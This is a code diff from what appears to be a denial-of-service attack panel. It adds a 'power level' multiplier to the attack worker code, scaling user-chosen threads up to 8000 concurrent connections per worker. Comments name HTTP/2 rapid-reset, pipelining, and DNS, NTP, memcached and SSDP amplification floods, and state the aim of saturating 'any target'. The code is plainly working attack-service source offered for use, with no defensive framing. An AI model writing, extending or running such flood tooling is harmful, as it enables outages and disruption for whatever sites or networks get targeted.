@@ -229,6 +229,16 @@ const DEV_MAX_THREADS = 256;
 let _activeWorkers = 0;
 const MAX_TOTAL_WORKERS = IS_DEPLOYED ? 64 : 48;
 
+// ── Thread Multiplier — "Power Level" UX ──────────────────────────────────
+// The UI accepts threads 1–8 (power level). Internally we multiply by this
+// factor to reach full connection concurrency.
+// threads=8 → 8 × 200 = 1600 concurrent connections per worker (prod).
+//   Rapid-reset: 1600 × MAX_INFLIGHT_FACTOR(100) = 80K in-flight per worker.
+//   H2 multiplex: 1600 × 8 streams = 12800 streams per session (capped 4000).
+//   Pipeline: 1600 conn × 512 reqs/write = 819K reqs per write batch.
+// Dev: smaller multiplier to stay within shared container limits.
+const THREAD_MULTIPLIER = IS_DEPLOYED ? 200 : 25;
+
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
   try {
@@ -826,6 +836,12 @@ async function runAttackWorkers(
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
   id?: number, // optional — needed by Geass Override T004 adaptive burst
 ): Promise<void> {
+  // ── Power-Level Boost ────────────────────────────────────────────────────
+  // UI sends threads 1–8 (power level). Multiply to get real connection count.
+  // threads=8 → 1600 concurrent connections per worker (prod) or 200 (dev).
+  // Cap: prod 8000 (enough to saturate any target), dev 256 (container safe).
+  threads = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 8000 : DEV_MAX_THREADS);
+
   // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
   // quic-flood is also UDP-based (port 443/UDP)
   // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
@@ -1518,8 +1534,9 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
   if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
   const { target, port, method, duration, threads, webhookUrl } = p.data;
 
-  // Show effective thread count (dev mode caps to DEV_MAX_THREADS)
-  const threadsEffective = IS_DEPLOYED ? threads : Math.min(threads, DEV_MAX_THREADS);
+  // Show effective connection count after power-level multiplier
+  // (threads × THREAD_MULTIPLIER, capped by prod/dev limits)
+  const threadsEffective = Math.min(threads * THREAD_MULTIPLIER, IS_DEPLOYED ? 8000 : DEV_MAX_THREADS);
 
   const [attack] = await db.insert(attacksTable).values({
     target, port, method, duration, threads, threadsEffective,
